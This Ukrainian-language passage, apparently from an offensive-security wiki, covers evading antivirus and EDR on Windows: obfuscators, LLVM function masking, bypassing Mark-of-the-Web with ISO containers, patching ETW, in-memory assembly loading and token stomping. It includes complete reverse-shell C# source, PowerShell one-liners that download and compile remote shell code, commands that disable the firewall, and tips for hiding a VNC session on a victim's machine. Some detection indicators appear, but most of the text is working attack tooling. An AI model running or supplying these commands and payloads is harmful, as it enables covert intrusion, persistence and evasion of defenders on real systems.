4.  Ручне очищення — запустіть отриманий бінарний файл у dnSpy, знайдіть великі Base64-блоки або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб виявити *справжній* payload. Часто malware зберігає його як TLV-кодований масив байтів, ініціалізований усередині `<Module>.byte_0`.

Наведений ланцюжок відновлює потік виконання **без** запуску шкідливого зразка — це корисно під час роботи на офлайн-робочій станції.

> 🛈  ConfuserEx створює користувацький атрибут `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного сортування зразків.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: обфускатор C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): мета цього проєкту — створити форк набору інструментів компіляції [LLVM](http://www.llvm.org/) з відкритим кодом, який підвищуватиме безпеку програмного забезпечення за допомогою [обфускації коду](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та захисту від втручання.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації обфускованого коду під час компіляції без зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): додає шар обфускованих операцій, згенерованих за допомогою фреймворку метапрограмування шаблонів C++, що трохи ускладнить життя тому, хто захоче зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це обфускатор бінарних файлів x64, який може обфускувати різні PE-файли, зокрема .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий рушій метаморфного коду для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це фреймворк для дрібнозернистої обфускації коду мов, що підтримуються LLVM, із використанням ROP (return-oriented programming). ROPfuscator обфускує програму на рівні асемблерного коду, перетворюючи звичайні інструкції на ROP-ланцюжки та руйнуючи наше звичне уявлення про нормальний потік керування.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor може перетворювати наявні EXE/DLL на shellcode, а потім завантажувати їх

### Самомаскування кожної функції за допомогою компілятора LLVM

Замість маскування всього implant лише під час простою модифікований backend LLVM X86 може зберігати вибрані функції в масці XOR, коли вони неактивні. PoC Function Peekaboo вибирає демангльовані імена, що містять `REG_`, вставляє незалежні від розташування entry/exit stubs навколо фінального машинного коду та розміщує один спільний обробник маскування в `.text`; сигнатури на рівні вихідного коду та домовленість викликів Windows x64 залишаються незмінними.<sup>[[38]](#references)[[39]](#references)</sup>

#### Перетворення потоку керування в backend

Це слід робити після вибору інструкцій та оптимізації, оскільки перетворення має охоплювати **кожне згенероване повернення** й враховувати точне розташування x86-коду. `MachineFunctionPass` перед емісією знаходить останній `MachineInstr::isReturn()`, видаляє його, щоб фінальний шлях переходив до доданого епілогу, а попередні інструкції повернення замінює на `JMP_1 handler`. Зберігайте будь-яке згенероване компілятором очищення стека/кадру перед кожним поверненням; перенаправляйте лише саму інструкцію повернення.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` і `emitFunctionBodyEnd()` генерують stubs для кожної функції, а `emitEndOfAsmFile()` — обробник. Символи, спільні для етапів емісії, дають змогу прологу перейти до епілогу, який буде згенеровано пізніше; для вручну згенерованого near `je` запишіть `0F 84`, а потім чотирибайтовий вираз MC `target - address_after_je`. Виклики та переходи до обробника натомість можна згенерувати як об’єкти `MCInst` (`CALL64pcrel32` і `JMP_1`). Якщо нічого не змінено, pass має повертати `false` для функції, яку не вибрано; PoC помилково повертає на цьому шляху `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Метадані та ініціалізація до CRT

PoC розміщує ключ XOR і записи по 16 байтів, що містять вказівник на функцію, виправлений завантажувачем, і довжину під час виконання, у `.funcmeta`. Хоча поле C має тип `uint32_t`, обробник читає QWORD за зсувом `+8` у записі, захоплюючи довжину та її доповнення, і переходить до наступного запису з кроком `0x10`. Назви секцій PE мають лише вісім байтів, тому під час виконання шукається `.funcmet`. Зовнішній patcher додає виконувану секцію `.stub`, зберігає старий RVA точки входу в stub і перенаправляє `AddressOfEntryPoint`; PIC stub отримує базу образу з `gs:[0x60]` → `[PEB+0x10]`, проходить таблицю імпортів PE32+, щоб знайти вже імпортовану `VirtualProtect`, і запускається до CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Під час ініціалізації в `gs:[0xE8]` встановлюється sentinel і викликається кожна функція з метаданих. Її пролог, який постійно залишається читабельним, записує початок функції в `gs:[0xF0]`, перевіряє sentinel і пропускає ще не замасковане тіло. Далі епілог виконує `call handler`; після того як обробник зберігає 13 регістрів (`0x68` байтів), адреса повернення в `[rsp+0x68]` вказує на кінець перетвореної функції, тож `end - start` можна записати в її запис метаданих. Після маскування всіх тіл stub очищає sentinel і переходить до `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Під час звичайного виклику пролог викликає той самий симетричний обробник, щоб декодувати тіло. Фінальний шлях переходить до доданого епілогу, тоді як кожне попереднє повернення переходить безпосередньо до спільного обробника. Звичайний епілог також використовує `jmp handler`, а не `call`, тож після повторного маскування `ret` обробника використовує адресу повернення початкового виклику та зберігає результат функції в `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Примітив маскування та індикатори аналізу

Обробник знаходить поточний запис, пропускає фіксований видимий пролог (у цій збірці — `0x46` байтів), змінює права доступу до решти на `PAGE_EXECUTE_READWRITE`, виконує XOR кожного байта з молодшим байтом ключа, а потім встановлює права `PAGE_EXECUTE_READ`. Таким чином, той самий цикл декодує код під час входу та кодує його під час кожного звичайного виходу.<sup>[[38]](#references)[[39]](#references)</sup>

До показових індикаторів цієї конструкції належать:<sup>[[38]](#references)[[39]](#references)</sup>

- точка входу всередині виконуваної секції `.stub` і секція `.funcmet`, що містить ключ і виправлені адреси вказівників на `.text`;
- розбір PEB, таблиці імпортів і таблиці секцій до запуску CRT із подальшими викликами через кожен вказівник із метаданих;
- однакові PIC-прологи `call`/`pop` і численні точки повернення, перенаправлені до одного обробника;
- записи в `gs:[0xE8]`, `gs:[0xF0]` і `gs:[0xF8]`, за якими йдуть повторювані зміни прав доступу через `VirtualProtect` і побайтові записи XOR у виконувані сторінки образу.

Це ухилення від сканерів пам’яті, а не криптографічний захист: у пропатченому файлі все ще міститься оригінальне незашифроване тіло, а debugger може зупинитися на `VirtualProtect` або циклі XOR і зняти дамп активної функції. Однобайтовий XOR, читабельні метадані та фіксована межа `0x46` також спрощують відновлення коду офлайн.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Слоти TEB у PoC є локальними для потоку, але змінені сторінки коду спільні для всього процесу. Тому паралельний або рекурсивний вхід може повторно перемикати інструкції, поки виконується інший виклик; винятки та нелокальні виходи також можуть обійти повторне маскування. Надійна реалізація має синхронізувати зміни, відновлювати права доступу, фактично повернуті через `lpflOldProtect`, уникати жорстко заданої довжини stub, перевіряти вирівнювання стека x64 для шляхів `call` і `jmp` та викликати `FlushInstructionCache` після переписування виконуваних байтів. Microsoft прямо покладає на викликачів відповідальність за узгодженість кешу інструкцій під час зміни виконуваного коду.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Можливо, ви бачили цей екран, коли завантажували з інтернету та запускали деякі виконувані файли.

Microsoft Defender SmartScreen — це механізм безпеки, призначений захищати кінцевих користувачів від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно використовує підхід на основі репутації: застосунки, які завантажують нечасто, викликають SmartScreen, який попереджає кінцевого користувача та не дозволяє запустити файл (хоча файл усе одно можна запустити, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [Alternate Data Stream NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється для файлів, завантажених з інтернету, і містить URL-адресу, з якої їх завантажили.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка ADS Zone.Identifier для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не викликатимуть SmartScreen**.

Дуже ефективний спосіб не допустити отримання вашими payloads позначки Mark of The Web — запакувати їх у контейнер на кшталт ISO. Це працює тому, що Mark-of-the-Web (MOTW) **не можна** застосувати до томів **не NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — це інструмент, який пакує payloads у вихідні контейнери, щоб уникнути Mark-of-the-Web.

Приклад використання:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ось демонстрація обходу SmartScreen за допомогою пакування payloads у файли ISO через [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм журналювання у Windows, який дає змогу застосункам і системним компонентам **записувати події**. Водночас його можуть використовувати продукти безпеки для моніторингу й виявлення шкідливої активності.

Так само як AMSI можна вимкнути (обійти), можна змусити функцію **`EtwEventWrite`** процесу в user space одразу повертати керування, не записуючи жодних подій. Для цього функцію патчать у пам’яті, щоб вона одразу повертала керування, фактично вимикаючи журналювання ETW для цього процесу.

Детальніше можна прочитати тут: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) і [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Рефлексія C#-збірок

Завантаження C#-бінарних файлів у пам’ять відоме вже досить давно й досі є чудовим способом запускати post-exploitation інструменти, не потрапляючи на очі AV.

Оскільки payload завантажуватиметься безпосередньо в пам’ять, не торкаючись диска, нам потрібно буде подбати лише про патчинг AMSI для всього процесу.

Більшість C2-фреймворків (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) уже дають змогу виконувати C#-збірки безпосередньо в пам’яті, але для цього є різні способи:

- **Fork\&Run**

Цей спосіб передбачає **запуск нового жертовного процесу**, ін’єкцію вашого шкідливого post-exploitation коду в цей новий процес, виконання коду й завершення нового процесу після завершення роботи. У цього способу є переваги й недоліки. Перевага методу fork and run полягає в тому, що виконання відбувається **поза** процесом нашого Beacon implant. Це означає, що якщо під час post-exploitation дій щось піде не так або нас виявлять, **імовірність того, що наш implant залишиться активним, значно вища.** Недолік полягає в тому, що **імовірність** виявлення **поведінковими засобами виявлення** також **вища**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Цей спосіб полягає в ін’єкції шкідливого post-exploitation коду **у власний процес**. Так можна уникнути створення нового процесу, який просканує AV, але є й недолік: якщо під час виконання payload щось піде не так, **імовірність втратити beacon значно вища**, оскільки процес може аварійно завершитися.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Щоб дізнатися більше про завантаження C#-збірок, прочитайте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) і ознайомтеся з їхнім BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Також можна завантажувати C#-збірки **з PowerShell**. Ознайомтеся з [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео від S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Перепакування .NET-інструментів у WebAssembly за допомогою NativeAOT (WasmForge)

Звичайні методи `execute-assembly` залишають впізнаваний MSIL і зрештою ініціалізують CLR. **WasmForge** натомість змінює середовище виконання: переносить C#-проєкт на експериментальну ціль NativeAOT-LLVM WASI, заздалегідь компілює його у WebAssembly і вбудовує цей модуль у Windows PE-хост на основі Wazero. Отриманому процесу не потрібні CLR, JIT або хост `dotnet` цільової системи, тому правила, що спираються лише на назви керованих збірок, завантаження CLR, AMSI або .NET ETW, втрачають пряму видимість. Це техніка обходу виявлення й пакування, а не обхід меж привілеїв: гостьовий процес зберігає дозволи й спостережувану поведінку вихідного інструмента в ОС.<sup>[[44]](#references)[[45]](#references)</sup>

### Збирання C#-проєкту

Рекомендований спосіб збирання — Docker-середовище проєкту, оскільки воно містить .NET 10 SDK, workload NativeAOT-LLVM, WASI SDK 24.0, компонувальник і залежності для підписування. Файл `.csproj` визначається автоматично; одноетапне збирання виконує міграцію, патчинг сумісності, компіляцію WASM, створення PE і підписування.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Для усунення проблем або перевірки згенерованого коду розділіть процес на такі кроки: `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` і фінальна команда `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. У build image також використовується обгортка `wasm-component-ld`, щоб уникнути кодування компонента WASI Preview 2 і створити звичайний модуль, очікуваний вбудованим runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Міст між wasm32 C# і x64 Win32

Це не прозора повторна компіляція. У NativeAOT-WASI відсутні або змінені функції BCL, орієнтовані на Windows, а гість wasm32 зазвичай виділяє чотирибайтові слоти для вказівників, тоді як x64 API можуть повертати восьмибайтові вказівники. WasmForge розв’язує обидві проблеми за допомогою таких згенерованих шарів:<sup>[[44]](#references)</sup>

1. Патчер вихідного коду виправляє семантичні відмінності, специфічні для AOT, і перенаправляє непідтримувані виклики реєстру, pipes, WMI, identity, directory-service, file-version, LSA та подібні виклики до помічників `Wf*`.
2. Сканер P/Invoke генерує зіставлення NativeAOT `DirectPInvoke`, щоб виклики `[DllImport]` прив’язувалися до скомпонованих C bridge symbols, а не динамічно завантажували оголошену DLL усередині гостя.
3. Для вказівників, що передаються хосту, у C# використовується `ulong`, а в C — `uint64_t`. Загальний диспетчер передає виклик обробнику Win32 хоста; `out8_mask` позначає справжні восьмибайтові слоти виводу, старші половини яких потрібно зберегти. Для непозначених виводів у форматі wasm32 використовується захист зі знімком і відновленням, щоб запис x64 не пошкодив сусідні чотири байти.
4. Спеціалізовані host bridges обробляють операції, які не підходять для загальної диспетчеризації системних викликів, зокрема доступ до кешу квитків LSA, операції Kerberos/BCrypt зі структурованими результатами, TCP-трафік KDC і LDAP-запити.

Наприклад, обгортка для `version.dll!VerQueryValueW` передає чотири адреси хоста й установлює біти 2 і 3 (`0xC`), оскільки вказівник на значення та довжина — це восьмибайтові слоти виводу. Сама обгортка залишається загальною та передає назву DLL, назву експорту, аргументи й маску до `wf_call_v2`; хост виконує перетворення вказівників і викликає native API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Обмеження та точки зміщення виявлення

Код із великою кількістю reflection, динамічне завантаження збірок, довільні native callbacks і складні структури x64, що повертаються в пам’ять WASM, усе ще можуть потребувати окремих патчів для кожного інструмента або взагалі не працювати. Універсальні сокети WASI Preview 2 також можуть викликати порожні заглушки, тому підтримувані інструменти використовують host shim-и для конкретних протоколів. Перевіряйте кожну команду на нативній збірці, а не припускайте, що всі можливості збігаються.<sup>[[44]](#references)[[45]](#references)</sup>

Ця техніка зміщує телеметрію, а не робить payload невидимим. Виявлення може перемкнутися на PE, що містить або матеріалізує модуль WASM, поведінку runtime на кшталт Wazero, незвичне виділення та копіювання пам’яті між host і guest, універсальну пряму диспетчеризацію Win32, аномалії підпису та ресурсів PE, а також спричинені цим виклики API й мережевий трафік. Тому відсутність подій завантаження CLR, AMSI чи .NET ETW не слід вважати доказом того, що процес нешкідливий.<sup>[[44]](#references)</sup>

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), шкідливий код можна виконувати іншими мовами, надавши скомпрометованій машині доступ **до середовища інтерпретатора, встановленого на SMB-шарі під контролем атакувальника**.

Надавши доступ до бінарних файлів інтерпретатора й середовища на SMB-шарі, можна **виконувати довільний код цими мовами в пам’яті** скомпрометованої машини.

У репозиторії зазначено: Defender і далі сканує скрипти, але використання Go, Java, PHP тощо дає нам **більше гнучкості для обходу статичних сигнатур**. Тестування випадкових необфускованих скриптів зворотної оболонки цими мовами виявилося успішним.

## WebAssembly re-hosting for static-analysis evasion

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping маніпулює токеном доступу такого продукту безпеки, як EDR або AV. Зменшення привілеїв токена може залишити процес запущеним, водночас не даючи йому виконувати привілейовані дії з перевірки чи усунення загроз.

Щоб запобігти цьому, Windows могла б **заборонити зовнішнім процесам** отримувати дескриптори токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання довіреного ПЗ

### Chrome Remote Desktop

Як описано в [**цій публікації блогу**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), Chrome Remote Desktop легко розгорнути на ПК жертви, а потім використати для отримання контролю та збереження доступу:<sup>[[35]](#references)</sup>
1. Завантажте програму з https://remotedesktop.google.com/, натисніть «Set up via SSH», а потім натисніть MSI-файл для Windows, щоб завантажити його.
2. Запустіть інсталятор у тихому режимі на машині жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть «Next». Майстер попросить авторизуватися; натисніть кнопку «Authorize», щоб продовжити.
4. Виконайте надану команду з потрібними змінами: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметр `--pin` задає PIN без використання GUI).
 

## Розширений обхід виявлення

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Обхід виявлення — дуже складна тема; іноді потрібно враховувати багато різних джерел телеметрії в одній системі, тому в зрілих середовищах практично неможливо залишатися повністю непоміченим.

У кожного середовища, з яким ви працюватимете, будуть свої сильні та слабкі сторони.

Наполегливо раджу переглянути цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати базове уявлення про більш просунуті техніки обходу виявлення.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це ще одна чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про багаторівневий обхід виявлення.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Старі техніки**

### **Перевірка, які частини Defender вважає шкідливими**

Можна скористатися [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видалятиме частини бінарного файла**, доки **не визначить, яку саме частину Defender** вважає шкідливою, а потім покаже її окремо.\
Ще один інструмент, що робить **те саме, —** [**avred**](https://github.com/dobin/avred), який пропонує цю послугу через відкритий вебсервіс [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows 10 усі версії Windows постачалися з **Telnet server**, який можна було встановити (від імені адміністратора), виконавши:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Налаштуйте його так, щоб воно **запускалося** під час запуску системи, і **запустіть** його зараз:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Змінити порт telnet** (приховано) та вимкнути брандмауер:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Завантажте звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (вам потрібні завантаження bin, а не інсталятор)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть параметр _Disable TrayIcon_
- Установіть пароль у полі _VNC Password_
- Установіть пароль у полі _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **комп’ютер жертви**

#### **Зворотне підключення**

**Зловмисник** має **запустити на своєму** **хості** бінарний файл `vncviewer.exe -listen 5900`, щоб він був **готовий** прийняти зворотне **VNC-підключення**. Потім на **комп’ютері жертви** запустіть демон winvnc командою `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**УВАГА:** Щоб не привертати уваги, не робіть кілька речей:

- Не запускайте `winvnc`, якщо він уже працює, інакше з’явиться [спливне вікно](https://i.imgur.com/1SROTTl.png). Перевірте, чи він запущений, командою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій самій директорії, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для перегляду довідки, інакше з’явиться [спливне вікно](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Усередині GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Тепер **запустіть слухач** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Поточний Defender дуже швидко завершить процес.**

### Компіляція власного reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Використовуйте це з:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# за допомогою компілятора

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Перелік обфускаторів C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Використання Python для створення прикладів інжекторів:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

